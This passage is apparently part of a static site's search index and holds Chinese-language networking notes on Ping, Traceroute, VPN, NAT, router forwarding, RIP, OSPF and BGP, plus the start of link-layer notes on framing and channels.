![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/aa29cc88-7256-4399-8c7f-3cf4a6489559.png" width="600)`},{header:"1. Ping",slug:"_1-ping",content:`Ping \u662F ICMP \u7684\u4E00\u4E2A\u91CD\u8981\u5E94\u7528\uFF0C\u4E3B\u8981\u7528\u6765\u6D4B\u8BD5\u4E24\u53F0\u4E3B\u673A\u4E4B\u95F4\u7684\u8FDE\u901A\u6027\u3002
Ping \u7684\u539F\u7406\u662F\u901A\u8FC7\u5411\u76EE\u7684\u4E3B\u673A\u53D1\u9001 ICMP Echo \u8BF7\u6C42\u62A5\u6587\uFF0C\u76EE\u7684\u4E3B\u673A\u6536\u5230\u4E4B\u540E\u4F1A\u53D1\u9001 Echo \u56DE\u7B54\u62A5\u6587\u3002Ping \u4F1A\u6839\u636E\u65F6\u95F4\u548C\u6210\u529F\u54CD\u5E94\u7684\u6B21\u6570\u4F30\u7B97\u51FA\u6570\u636E\u5305\u5F80\u8FD4\u65F6\u95F4\u4EE5\u53CA\u4E22\u5305\u7387\u3002`},{header:"2. Traceroute",slug:"_2-traceroute",content:`Traceroute \u662F ICMP \u7684\u53E6\u4E00\u4E2A\u5E94\u7528\uFF0C\u7528\u6765\u8DDF\u8E2A\u4E00\u4E2A\u5206\u7EC4\u4ECE\u6E90\u70B9\u5230\u7EC8\u70B9\u7684\u8DEF\u5F84\u3002
Traceroute \u53D1\u9001\u7684 IP \u6570\u636E\u62A5\u5C01\u88C5\u7684\u662F\u65E0\u6CD5\u4EA4\u4ED8\u7684 UDP \u7528\u6237\u6570\u636E\u62A5\uFF0C\u5E76\u7531\u76EE\u7684\u4E3B\u673A\u53D1\u9001\u7EC8\u70B9\u4E0D\u53EF\u8FBE\u5DEE\u9519\u62A5\u544A\u62A5\u6587\u3002 \u6E90\u4E3B\u673A\u5411\u76EE\u7684\u4E3B\u673A\u53D1\u9001\u4E00\u8FDE\u4E32\u7684 IP \u6570\u636E\u62A5\u3002\u7B2C\u4E00\u4E2A\u6570\u636E\u62A5 P1 \u7684\u751F\u5B58\u65F6\u95F4 TTL \u8BBE\u7F6E\u4E3A 1\uFF0C\u5F53 P1 \u5230\u8FBE\u8DEF\u5F84\u4E0A\u7684\u7B2C\u4E00\u4E2A\u8DEF\u7531\u5668 R1 \u65F6\uFF0CR1 \u6536\u4E0B\u5B83\u5E76\u628A TTL \u51CF 1\uFF0C\u6B64\u65F6 TTL \u7B49\u4E8E 0\uFF0CR1 \u5C31\u628A P1 \u4E22\u5F03\uFF0C\u5E76\u5411\u6E90\u4E3B\u673A\u53D1\u9001\u4E00\u4E2A ICMP \u65F6\u95F4\u8D85\u8FC7\u5DEE\u9519\u62A5\u544A\u62A5\u6587\uFF1B
\u6E90\u4E3B\u673A\u63A5\u7740\u53D1\u9001\u7B2C\u4E8C\u4E2A\u6570\u636E\u62A5 P2\uFF0C\u5E76\u628A TTL \u8BBE\u7F6E\u4E3A 2\u3002P2 \u5148\u5230\u8FBE R1\uFF0CR1 \u6536\u4E0B\u540E\u628A TTL \u51CF 1 \u518D\u8F6C\u53D1\u7ED9 R2\uFF0CR2 \u6536\u4E0B\u540E\u4E5F\u628A TTL \u51CF 1\uFF0C\u7531\u4E8E\u6B64\u65F6 TTL \u7B49\u4E8E 0\uFF0CR2 \u5C31\u4E22\u5F03 P2\uFF0C\u5E76\u5411\u6E90\u4E3B\u673A\u53D1\u9001\u4E00\u4E2A ICMP \u65F6\u95F4\u8D85\u8FC7\u5DEE\u9519\u62A5\u6587\u3002
\u4E0D\u65AD\u6267\u884C\u8FD9\u6837\u7684\u6B65\u9AA4\uFF0C\u76F4\u5230\u6700\u540E\u4E00\u4E2A\u6570\u636E\u62A5\u521A\u521A\u5230\u8FBE\u76EE\u7684\u4E3B\u673A\uFF0C\u4E3B\u673A\u4E0D\u8F6C\u53D1\u6570\u636E\u62A5\uFF0C\u4E5F\u4E0D\u628A TTL \u503C\u51CF 1\u3002\u4F46\u662F\u56E0\u4E3A\u6570\u636E\u62A5\u5C01\u88C5\u7684\u662F\u65E0\u6CD5\u4EA4\u4ED8\u7684 UDP\uFF0C\u56E0\u6B64\u76EE\u7684\u4E3B\u673A\u8981\u5411\u6E90\u4E3B\u673A\u53D1\u9001 ICMP \u7EC8\u70B9\u4E0D\u53EF\u8FBE\u5DEE\u9519\u62A5\u544A\u62A5\u6587\u3002
\u4E4B\u540E\u6E90\u4E3B\u673A\u77E5\u9053\u4E86\u5230\u8FBE\u76EE\u7684\u4E3B\u673A\u6240\u7ECF\u8FC7\u7684\u8DEF\u7531\u5668 IP \u5730\u5740\u4EE5\u53CA\u5230\u8FBE\u6BCF\u4E2A\u8DEF\u7531\u5668\u7684\u5F80\u8FD4\u65F6\u95F4\u3002`},{header:"\u865A\u62DF\u4E13\u7528\u7F51 VPN",slug:"\u865A\u62DF\u4E13\u7528\u7F51-vpn",content:`\u7531\u4E8E IP \u5730\u5740\u7684\u7D27\u7F3A\uFF0C\u4E00\u4E2A\u673A\u6784\u80FD\u7533\u8BF7\u5230\u7684 IP \u5730\u5740\u6570\u5F80\u5F80\u8FDC\u5C0F\u4E8E\u672C\u673A\u6784\u6240\u62E5\u6709\u7684\u4E3B\u673A\u6570\u3002\u5E76\u4E14\u4E00\u4E2A\u673A\u6784\u5E76\u4E0D\u9700\u8981\u628A\u6240\u6709\u7684\u4E3B\u673A\u63A5\u5165\u5230\u5916\u90E8\u7684\u4E92\u8054\u7F51\u4E2D\uFF0C\u673A\u6784\u5185\u7684\u8BA1\u7B97\u673A\u53EF\u4EE5\u4F7F\u7528\u4EC5\u5728\u672C\u673A\u6784\u6709\u6548\u7684 IP \u5730\u5740\uFF08\u4E13\u7528\u5730\u5740\uFF09\u3002
\u6709\u4E09\u4E2A\u4E13\u7528\u5730\u5740\u5757\uFF1A 10.0.0.0 ~ 10.255.255.255
172.16.0.0 ~ 172.31.255.255
192.168.0.0 ~ 192.168.255.255 VPN \u4F7F\u7528\u516C\u7528\u7684\u4E92\u8054\u7F51\u4F5C\u4E3A\u672C\u673A\u6784\u5404\u4E13\u7528\u7F51\u4E4B\u95F4\u7684\u901A\u4FE1\u8F7D\u4F53\u3002\u4E13\u7528\u6307\u673A\u6784\u5185\u7684\u4E3B\u673A\u53EA\u4E0E\u672C\u673A\u6784\u5185\u7684\u5176\u5B83\u4E3B\u673A\u901A\u4FE1\uFF1B\u865A\u62DF\u6307\u597D\u50CF\u662F\uFF0C\u800C\u5B9E\u9645\u4E0A\u5E76\u4E0D\u662F\uFF0C\u5B83\u6709\u7ECF\u8FC7\u516C\u7528\u7684\u4E92\u8054\u7F51\u3002
\u4E0B\u56FE\u4E2D\uFF0C\u573A\u6240 A \u548C B \u7684\u901A\u4FE1\u7ECF\u8FC7\u4E92\u8054\u7F51\uFF0C\u5982\u679C\u573A\u6240 A \u7684\u4E3B\u673A X \u8981\u548C\u53E6\u4E00\u4E2A\u573A\u6240 B \u7684\u4E3B\u673A Y \u901A\u4FE1\uFF0CIP \u6570\u636E\u62A5\u7684\u6E90\u5730\u5740\u662F 10.1.0.1\uFF0C\u76EE\u7684\u5730\u5740\u662F 10.2.0.3\u3002\u6570\u636E\u62A5\u5148\u53D1\u9001\u5230\u4E0E\u4E92\u8054\u7F51\u76F8\u8FDE\u7684\u8DEF\u7531\u5668 R1\uFF0CR1 \u5BF9\u5185\u90E8\u6570\u636E\u8FDB\u884C\u52A0\u5BC6\uFF0C\u7136\u540E\u91CD\u65B0\u52A0\u4E0A\u6570\u636E\u62A5\u7684\u9996\u90E8\uFF0C\u6E90\u5730\u5740\u662F\u8DEF\u7531\u5668 R1 \u7684\u5168\u7403\u5730\u5740 125.1.2.3\uFF0C\u76EE\u7684\u5730\u5740\u662F\u8DEF\u7531\u5668 R2 \u7684\u5168\u7403\u5730\u5740 194.4.5.6\u3002\u8DEF\u7531\u5668 R2 \u6536\u5230\u6570\u636E\u62A5\u540E\u5C06\u6570\u636E\u90E8\u5206\u8FDB\u884C\u89E3\u5BC6\uFF0C\u6062\u590D\u539F\u6765\u7684\u6570\u636E\u62A5\uFF0C\u6B64\u65F6\u76EE\u7684\u5730\u5740\u4E3A 10.2.0.3\uFF0C\u5C31\u4EA4\u4ED8\u7ED9 Y\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1556770b-8c01-4681-af10-46f1df69202c.jpg" width="800)`},{header:"\u7F51\u7EDC\u5730\u5740\u8F6C\u6362 NAT",slug:"\u7F51\u7EDC\u5730\u5740\u8F6C\u6362-nat",content:`\u4E13\u7528\u7F51\u5185\u90E8\u7684\u4E3B\u673A\u4F7F\u7528\u672C\u5730 IP \u5730\u5740\u53C8\u60F3\u548C\u4E92\u8054\u7F51\u4E0A\u7684\u4E3B\u673A\u901A\u4FE1\u65F6\uFF0C\u53EF\u4EE5\u4F7F\u7528 NAT \u6765\u5C06\u672C\u5730 IP \u8F6C\u6362\u4E3A\u5168\u7403 IP\u3002
\u5728\u4EE5\u524D\uFF0CNAT \u5C06\u672C\u5730 IP \u548C\u5168\u7403 IP \u4E00\u4E00\u5BF9\u5E94\uFF0C\u8FD9\u79CD\u65B9\u5F0F\u4E0B\u62E5\u6709 n \u4E2A\u5168\u7403 IP \u5730\u5740\u7684\u4E13\u7528\u7F51\u5185\u6700\u591A\u53EA\u53EF\u4EE5\u540C\u65F6\u6709 n \u53F0\u4E3B\u673A\u63A5\u5165\u4E92\u8054\u7F51\u3002\u4E3A\u4E86\u66F4\u6709\u6548\u5730\u5229\u7528\u5168\u7403 IP \u5730\u5740\uFF0C\u73B0\u5728\u5E38\u7528\u7684 NAT \u8F6C\u6362\u8868\u628A\u4F20\u8F93\u5C42\u7684\u7AEF\u53E3\u53F7\u4E5F\u7528\u4E0A\u4E86\uFF0C\u4F7F\u5F97\u591A\u4E2A\u4E13\u7528\u7F51\u5185\u90E8\u7684\u4E3B\u673A\u5171\u7528\u4E00\u4E2A\u5168\u7403 IP \u5730\u5740\u3002\u4F7F\u7528\u7AEF\u53E3\u53F7\u7684 NAT \u4E5F\u53EB\u505A\u7F51\u7EDC\u5730\u5740\u4E0E\u7AEF\u53E3\u8F6C\u6362 NAPT\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2719067e-b299-4639-9065-bed6729dbf0b.png" width=")`},{header:"\u8DEF\u7531\u5668\u7684\u7ED3\u6784",slug:"\u8DEF\u7531\u5668\u7684\u7ED3\u6784",content:`\u8DEF\u7531\u5668\u4ECE\u529F\u80FD\u4E0A\u53EF\u4EE5\u5212\u5206\u4E3A\uFF1A\u8DEF\u7531\u9009\u62E9\u548C\u5206\u7EC4\u8F6C\u53D1\u3002
\u5206\u7EC4\u8F6C\u53D1\u7ED3\u6784\u7531\u4E09\u4E2A\u90E8\u5206\u7EC4\u6210\uFF1A\u4EA4\u6362\u7ED3\u6784\u3001\u4E00\u7EC4\u8F93\u5165\u7AEF\u53E3\u548C\u4E00\u7EC4\u8F93\u51FA\u7AEF\u53E3\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c3369072-c740-43b0-b276-202bd1d3960d.jpg" width="600)`},{header:"\u8DEF\u7531\u5668\u5206\u7EC4\u8F6C\u53D1\u6D41\u7A0B",slug:"\u8DEF\u7531\u5668\u5206\u7EC4\u8F6C\u53D1\u6D41\u7A0B",content:`\u4ECE\u6570\u636E\u62A5\u7684\u9996\u90E8\u63D0\u53D6\u76EE\u7684\u4E3B\u673A\u7684 IP \u5730\u5740 D\uFF0C\u5F97\u5230\u76EE\u7684\u7F51\u7EDC\u5730\u5740 N\u3002
\u82E5 N \u5C31\u662F\u4E0E\u6B64\u8DEF\u7531\u5668\u76F4\u63A5\u76F8\u8FDE\u7684\u67D0\u4E2A\u7F51\u7EDC\u5730\u5740\uFF0C\u5219\u8FDB\u884C\u76F4\u63A5\u4EA4\u4ED8\uFF1B
\u82E5\u8DEF\u7531\u8868\u4E2D\u6709\u76EE\u7684\u5730\u5740\u4E3A D \u7684\u7279\u5B9A\u4E3B\u673A\u8DEF\u7531\uFF0C\u5219\u628A\u6570\u636E\u62A5\u4F20\u9001\u7ED9\u8868\u4E2D\u6240\u6307\u660E\u7684\u4E0B\u4E00\u8DF3\u8DEF\u7531\u5668\uFF1B
\u82E5\u8DEF\u7531\u8868\u4E2D\u6709\u5230\u8FBE\u7F51\u7EDC N \u7684\u8DEF\u7531\uFF0C\u5219\u628A\u6570\u636E\u62A5\u4F20\u9001\u7ED9\u8DEF\u7531\u8868\u4E2D\u6240\u6307\u660E\u7684\u4E0B\u4E00\u8DF3\u8DEF\u7531\u5668\uFF1B
\u82E5\u8DEF\u7531\u8868\u4E2D\u6709\u4E00\u4E2A\u9ED8\u8BA4\u8DEF\u7531\uFF0C\u5219\u628A\u6570\u636E\u62A5\u4F20\u9001\u7ED9\u8DEF\u7531\u8868\u4E2D\u6240\u6307\u660E\u7684\u9ED8\u8BA4\u8DEF\u7531\u5668\uFF1B
\u62A5\u544A\u8F6C\u53D1\u5206\u7EC4\u51FA\u9519\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1ab49e39-012b-4383-8284-26570987e3c4.jpg" width="800)`},{header:"\u8DEF\u7531\u9009\u62E9\u534F\u8BAE",slug:"\u8DEF\u7531\u9009\u62E9\u534F\u8BAE",content:`\u8DEF\u7531\u9009\u62E9\u534F\u8BAE\u90FD\u662F\u81EA\u9002\u5E94\u7684\uFF0C\u80FD\u968F\u7740\u7F51\u7EDC\u901A\u4FE1\u91CF\u548C\u62D3\u6251\u7ED3\u6784\u7684\u53D8\u5316\u800C\u81EA\u9002\u5E94\u5730\u8FDB\u884C\u8C03\u6574\u3002
\u4E92\u8054\u7F51\u53EF\u4EE5\u5212\u5206\u4E3A\u8BB8\u591A\u8F83\u5C0F\u7684\u81EA\u6CBB\u7CFB\u7EDF AS\uFF0C\u4E00\u4E2A AS \u53EF\u4EE5\u4F7F\u7528\u4E00\u79CD\u548C\u522B\u7684 AS \u4E0D\u540C\u7684\u8DEF\u7531\u9009\u62E9\u534F\u8BAE\u3002
\u53EF\u4EE5\u628A\u8DEF\u7531\u9009\u62E9\u534F\u8BAE\u5212\u5206\u4E3A\u4E24\u5927\u7C7B\uFF1A \u81EA\u6CBB\u7CFB\u7EDF\u5185\u90E8\u7684\u8DEF\u7531\u9009\u62E9\uFF1ARIP \u548C OSPF
\u81EA\u6CBB\u7CFB\u7EDF\u95F4\u7684\u8DEF\u7531\u9009\u62E9\uFF1ABGP`},{header:"1. \u5185\u90E8\u7F51\u5173\u534F\u8BAE RIP",slug:"_1-\u5185\u90E8\u7F51\u5173\u534F\u8BAE-rip",content:`RIP \u662F\u4E00\u79CD\u57FA\u4E8E\u8DDD\u79BB\u5411\u91CF\u7684\u8DEF\u7531\u9009\u62E9\u534F\u8BAE\u3002\u8DDD\u79BB\u662F\u6307\u8DF3\u6570\uFF0C\u76F4\u63A5\u76F8\u8FDE\u7684\u8DEF\u7531\u5668\u8DF3\u6570\u4E3A 1\u3002\u8DF3\u6570\u6700\u591A\u4E3A 15\uFF0C\u8D85\u8FC7 15 \u8868\u793A\u4E0D\u53EF\u8FBE\u3002
RIP \u6309\u56FA\u5B9A\u7684\u65F6\u95F4\u95F4\u9694\u4EC5\u548C\u76F8\u90BB\u8DEF\u7531\u5668\u4EA4\u6362\u81EA\u5DF1\u7684\u8DEF\u7531\u8868\uFF0C\u7ECF\u8FC7\u82E5\u5E72\u6B21\u4EA4\u6362\u4E4B\u540E\uFF0C\u6240\u6709\u8DEF\u7531\u5668\u6700\u7EC8\u4F1A\u77E5\u9053\u5230\u8FBE\u672C\u81EA\u6CBB\u7CFB\u7EDF\u4E2D\u4EFB\u4F55\u4E00\u4E2A\u7F51\u7EDC\u7684\u6700\u77ED\u8DDD\u79BB\u548C\u4E0B\u4E00\u8DF3\u8DEF\u7531\u5668\u5730\u5740\u3002
\u8DDD\u79BB\u5411\u91CF\u7B97\u6CD5\uFF1A \u5BF9\u5730\u5740\u4E3A X \u7684\u76F8\u90BB\u8DEF\u7531\u5668\u53D1\u6765\u7684 RIP \u62A5\u6587\uFF0C\u5148\u4FEE\u6539\u62A5\u6587\u4E2D\u7684\u6240\u6709\u9879\u76EE\uFF0C\u628A\u4E0B\u4E00\u8DF3\u5B57\u6BB5\u4E2D\u7684\u5730\u5740\u6539\u4E3A X\uFF0C\u5E76\u628A\u6240\u6709\u7684\u8DDD\u79BB\u5B57\u6BB5\u52A0 1\uFF1B
\u5BF9\u4FEE\u6539\u540E\u7684 RIP \u62A5\u6587\u4E2D\u7684\u6BCF\u4E00\u4E2A\u9879\u76EE\uFF0C\u8FDB\u884C\u4EE5\u4E0B\u6B65\u9AA4\uFF1A
\u82E5\u539F\u6765\u7684\u8DEF\u7531\u8868\u4E2D\u6CA1\u6709\u76EE\u7684\u7F51\u7EDC N\uFF0C\u5219\u628A\u8BE5\u9879\u76EE\u6DFB\u52A0\u5230\u8DEF\u7531\u8868\u4E2D\uFF1B
\u5426\u5219\uFF1A\u82E5\u4E0B\u4E00\u8DF3\u8DEF\u7531\u5668\u5730\u5740\u662F X\uFF0C\u5219\u628A\u6536\u5230\u7684\u9879\u76EE\u66FF\u6362\u539F\u6765\u8DEF\u7531\u8868\u4E2D\u7684\u9879\u76EE\uFF1B\u5426\u5219\uFF1A\u82E5\u6536\u5230\u7684\u9879\u76EE\u4E2D\u7684\u8DDD\u79BB d \u5C0F\u4E8E\u8DEF\u7531\u8868\u4E2D\u7684\u8DDD\u79BB\uFF0C\u5219\u8FDB\u884C\u66F4\u65B0\uFF08\u4F8B\u5982\u539F\u59CB\u8DEF\u7531\u8868\u9879\u4E3A Net2, 5, P\uFF0C\u65B0\u8868\u9879\u4E3A Net2, 4, X\uFF0C\u5219\u66F4\u65B0\uFF09\uFF1B\u5426\u5219\u4EC0\u4E48\u4E5F\u4E0D\u505A\u3002
\u82E5 3 \u5206\u949F\u8FD8\u6CA1\u6709\u6536\u5230\u76F8\u90BB\u8DEF\u7531\u5668\u7684\u66F4\u65B0\u8DEF\u7531\u8868\uFF0C\u5219\u628A\u8BE5\u76F8\u90BB\u8DEF\u7531\u5668\u6807\u4E3A\u4E0D\u53EF\u8FBE\uFF0C\u5373\u628A\u8DDD\u79BB\u7F6E\u4E3A 16\u3002 RIP \u534F\u8BAE\u5B9E\u73B0\u7B80\u5355\uFF0C\u5F00\u9500\u5C0F\u3002\u4F46\u662F RIP \u80FD\u4F7F\u7528\u7684\u6700\u5927\u8DDD\u79BB\u4E3A 15\uFF0C\u9650\u5236\u4E86\u7F51\u7EDC\u7684\u89C4\u6A21\u3002\u5E76\u4E14\u5F53\u7F51\u7EDC\u51FA\u73B0\u6545\u969C\u65F6\uFF0C\u8981\u7ECF\u8FC7\u6BD4\u8F83\u957F\u7684\u65F6\u95F4\u624D\u80FD\u5C06\u6B64\u6D88\u606F\u4F20\u9001\u5230\u6240\u6709\u8DEF\u7531\u5668\u3002`},{header:"2. \u5185\u90E8\u7F51\u5173\u534F\u8BAE OSPF",slug:"_2-\u5185\u90E8\u7F51\u5173\u534F\u8BAE-ospf",content:`\u5F00\u653E\u6700\u77ED\u8DEF\u5F84\u4F18\u5148 OSPF\uFF0C\u662F\u4E3A\u4E86\u514B\u670D RIP \u7684\u7F3A\u70B9\u800C\u5F00\u53D1\u51FA\u6765\u7684\u3002
\u5F00\u653E\u8868\u793A OSPF \u4E0D\u53D7\u67D0\u4E00\u5BB6\u5382\u5546\u63A7\u5236\uFF0C\u800C\u662F\u516C\u5F00\u53D1\u8868\u7684\uFF1B\u6700\u77ED\u8DEF\u5F84\u4F18\u5148\u8868\u793A\u4F7F\u7528\u4E86 Dijkstra \u63D0\u51FA\u7684\u6700\u77ED\u8DEF\u5F84\u7B97\u6CD5 SPF\u3002
OSPF \u5177\u6709\u4EE5\u4E0B\u7279\u70B9\uFF1A \u5411\u672C\u81EA\u6CBB\u7CFB\u7EDF\u4E2D\u7684\u6240\u6709\u8DEF\u7531\u5668\u53D1\u9001\u4FE1\u606F\uFF0C\u8FD9\u79CD\u65B9\u6CD5\u662F\u6D2A\u6CDB\u6CD5\u3002
\u53D1\u9001\u7684\u4FE1\u606F\u5C31\u662F\u4E0E\u76F8\u90BB\u8DEF\u7531\u5668\u7684\u94FE\u8DEF\u72B6\u6001\uFF0C\u94FE\u8DEF\u72B6\u6001\u5305\u62EC\u4E0E\u54EA\u4E9B\u8DEF\u7531\u5668\u76F8\u8FDE\u4EE5\u53CA\u94FE\u8DEF\u7684\u5EA6\u91CF\uFF0C\u5EA6\u91CF\u7528\u8D39\u7528\u3001\u8DDD\u79BB\u3001\u65F6\u5EF6\u3001\u5E26\u5BBD\u7B49\u6765\u8868\u793A\u3002
\u53EA\u6709\u5F53\u94FE\u8DEF\u72B6\u6001\u53D1\u751F\u53D8\u5316\u65F6\uFF0C\u8DEF\u7531\u5668\u624D\u4F1A\u53D1\u9001\u4FE1\u606F\u3002 \u6240\u6709\u8DEF\u7531\u5668\u90FD\u5177\u6709\u5168\u7F51\u7684\u62D3\u6251\u7ED3\u6784\u56FE\uFF0C\u5E76\u4E14\u662F\u4E00\u81F4\u7684\u3002\u76F8\u6BD4\u4E8E RIP\uFF0COSPF \u7684\u66F4\u65B0\u8FC7\u7A0B\u6536\u655B\u7684\u5F88\u5FEB\u3002`},{header:"3. \u5916\u90E8\u7F51\u5173\u534F\u8BAE BGP",slug:"_3-\u5916\u90E8\u7F51\u5173\u534F\u8BAE-bgp",content:`BGP\uFF08Border Gateway Protocol\uFF0C\u8FB9\u754C\u7F51\u5173\u534F\u8BAE\uFF09
AS \u4E4B\u95F4\u7684\u8DEF\u7531\u9009\u62E9\u5F88\u56F0\u96BE\uFF0C\u4E3B\u8981\u662F\u7531\u4E8E\uFF1A \u4E92\u8054\u7F51\u89C4\u6A21\u5F88\u5927\uFF1B
\u5404\u4E2A AS \u5185\u90E8\u4F7F\u7528\u4E0D\u540C\u7684\u8DEF\u7531\u9009\u62E9\u534F\u8BAE\uFF0C\u65E0\u6CD5\u51C6\u786E\u5B9A\u4E49\u8DEF\u5F84\u7684\u5EA6\u91CF\uFF1B
AS \u4E4B\u95F4\u7684\u8DEF\u7531\u9009\u62E9\u5FC5\u987B\u8003\u8651\u6709\u5173\u7684\u7B56\u7565\uFF0C\u6BD4\u5982\u6709\u4E9B AS \u4E0D\u613F\u610F\u8BA9\u5176\u5B83 AS \u7ECF\u8FC7\u3002 BGP \u53EA\u80FD\u5BFB\u627E\u4E00\u6761\u6BD4\u8F83\u597D\u7684\u8DEF\u7531\uFF0C\u800C\u4E0D\u662F\u6700\u4F73\u8DEF\u7531\u3002
\u6BCF\u4E2A AS \u90FD\u5FC5\u987B\u914D\u7F6E BGP \u53D1\u8A00\u4EBA\uFF0C\u901A\u8FC7\u5728\u4E24\u4E2A\u76F8\u90BB BGP \u53D1\u8A00\u4EBA\u4E4B\u95F4\u5EFA\u7ACB TCP \u8FDE\u63A5\u6765\u4EA4\u6362\u8DEF\u7531\u4FE1\u606F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9cd0ae20-4fb5-4017-a000-f7d3a0eb3529.png" width="600)`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E9%93%BE%E8%B7%AF%E5%B1%82.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u94FE\u8DEF\u5C42",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u94FE\u8DEF\u5C42",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC-\u94FE\u8DEF\u5C42",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC - \u94FE\u8DEF\u5C42 \u57FA\u672C\u95EE\u9898 1. \u5C01\u88C5\u6210\u5E27
2. \u900F\u660E\u4F20\u8F93
3. \u5DEE\u9519\u68C0\u6D4B \u4FE1\u9053\u5206\u7C7B 1. \u5E7F\u64AD\u4FE1\u9053
2. \u70B9\u5BF9\u70B9\u4FE1\u9053 \u4FE1\u9053\u590D\u7528\u6280\u672F 1. \u9891\u5206\u590D\u7528
2. \u65F6\u5206\u590D\u7528
3. \u7EDF\u8BA1\u65F6\u5206\u590D\u7528
4. \u6CE2\u5206\u590D\u7528
5. \u7801\u5206\u590D\u7528 CSMA/CD \u534F\u8BAE
PPP \u534F\u8BAE
MAC \u5730\u5740
\u5C40\u57DF\u7F51
\u4EE5\u592A\u7F51
\u4EA4\u6362\u673A
\u865A\u62DF\u5C40\u57DF\u7F51`},{header:"\u57FA\u672C\u95EE\u9898",slug:"\u57FA\u672C\u95EE\u9898",content:""},{header:"1. \u5C01\u88C5\u6210\u5E27",slug:"_1-\u5C01\u88C5\u6210\u5E27",content:`\u5C06\u7F51\u7EDC\u5C42\u4F20\u4E0B\u6765\u7684\u5206\u7EC4\u6DFB\u52A0\u9996\u90E8\u548C\u5C3E\u90E8\uFF0C\u7528\u4E8E\u6807\u8BB0\u5E27\u7684\u5F00\u59CB\u548C\u7ED3\u675F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/29a14735-e154-4f60-9a04-c9628e5d09f4.png" width="300)`},{header:"2. \u900F\u660E\u4F20\u8F93",slug:"_2-\u900F\u660E\u4F20\u8F93",content:`\u900F\u660E\u8868\u793A\u4E00\u4E2A\u5B9E\u9645\u5B58\u5728\u7684\u4E8B\u7269\u770B\u8D77\u6765\u597D\u50CF\u4E0D\u5B58\u5728\u4E00\u6837\u3002
\u5E27\u4F7F\u7528\u9996\u90E8\u548C\u5C3E\u90E8\u8FDB\u884C\u5B9A\u754C\uFF0C\u5982\u679C\u5E27\u7684\u6570\u636E\u90E8\u5206\u542B\u6709\u548C\u9996\u90E8\u5C3E\u90E8\u76F8\u540C\u7684\u5185\u5BB9\uFF0C\u90A3\u4E48\u5E27\u7684\u5F00\u59CB\u548C\u7ED3\u675F\u4F4D\u7F6E\u5C31\u4F1A\u88AB\u9519\u8BEF\u7684\u5224\u5B9A\u3002\u9700\u8981\u5728\u6570\u636E\u90E8\u5206\u51FA\u73B0\u9996\u90E8\u5C3E\u90E8\u76F8\u540C\u7684\u5185\u5BB9\u524D\u9762\u63D2\u5165\u8F6C\u4E49\u5B57\u7B26\u3002\u5982\u679C\u6570\u636E\u90E8\u5206\u51FA\u73B0\u8F6C\u4E49\u5B57\u7B26\uFF0C\u90A3\u4E48\u5C31\u5728\u8F6C\u4E49\u5B57\u7B26\u524D\u9762\u518D\u52A0\u4E2A\u8F6C\u4E49\u5B57\u7B26\u3002\u5728\u63A5\u6536\u7AEF\u8FDB\u884C\u5904\u7406\u4E4B\u540E\u53EF\u4EE5\u8FD8\u539F\u51FA\u539F\u59CB\u6570\u636E\u3002\u8FD9\u4E2A\u8FC7\u7A0B\u900F\u660E\u4F20\u8F93\u7684\u5185\u5BB9\u662F\u8F6C\u4E49\u5B57\u7B26\uFF0C\u7528\u6237\u5BDF\u89C9\u4E0D\u5230\u8F6C\u4E49\u5B57\u7B26\u7684\u5B58\u5728\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e738a3d2-f42e-4755-ae13-ca23497e7a97.png" width="500)`},{header:"3. \u5DEE\u9519\u68C0\u6D4B",slug:"_3-\u5DEE\u9519\u68C0\u6D4B",content:"\u76EE\u524D\u6570\u636E\u94FE\u8DEF\u5C42\u5E7F\u6CDB\u4F7F\u7528\u4E86\u5FAA\u73AF\u5197\u4F59\u68C0\u9A8C\uFF08CRC\uFF09\u6765\u68C0\u67E5\u6BD4\u7279\u5DEE\u9519\u3002"},{header:"\u4FE1\u9053\u5206\u7C7B",slug:"\u4FE1\u9053\u5206\u7C7B",content:""},{header:"1. \u5E7F\u64AD\u4FE1\u9053",slug:"_1-\u5E7F\u64AD\u4FE1\u9053",content:`\u4E00\u5BF9\u591A\u901A\u4FE1\uFF0C\u4E00\u4E2A\u8282\u70B9\u53D1\u9001\u7684\u6570\u636E\u80FD\u591F\u88AB\u5E7F\u64AD\u4FE1\u9053\u4E0A\u6240\u6709\u7684\u8282\u70B9\u63A5\u6536\u5230\u3002
\u6240\u6709\u7684\u8282\u70B9\u90FD\u5728\u540C\u4E00\u4E2A\u5E7F\u64AD\u4FE1\u9053\u4E0A\u53D1\u9001\u6570\u636E\uFF0C\u56E0\u6B64\u9700\u8981\u6709\u4E13\u95E8\u7684\u63A7\u5236\u65B9\u6CD5\u8FDB\u884C\u534F\u8C03\uFF0C\u907F\u514D\u53D1\u751F\u51B2\u7A81\uFF08\u51B2\u7A81\u4E5F\u53EB\u78B0\u649E\uFF09\u3002
\u4E3B\u8981\u6709\u4E24\u79CD\u63A7\u5236\u65B9\u6CD5\u8FDB\u884C\u534F\u8C03\uFF0C\u4E00\u4E2A\u662F\u4F7F\u7528\u4FE1\u9053\u590D\u7528\u6280\u672F\uFF0C\u4E00\u662F\u4F7F\u7528 CSMA/CD \u534F\u8BAE\u3002`},{header:"2. \u70B9\u5BF9\u70B9\u4FE1\u9053",slug:"_2-\u70B9\u5BF9\u70B9\u4FE1\u9053",content:`\u4E00\u5BF9\u4E00\u901A\u4FE1\u3002
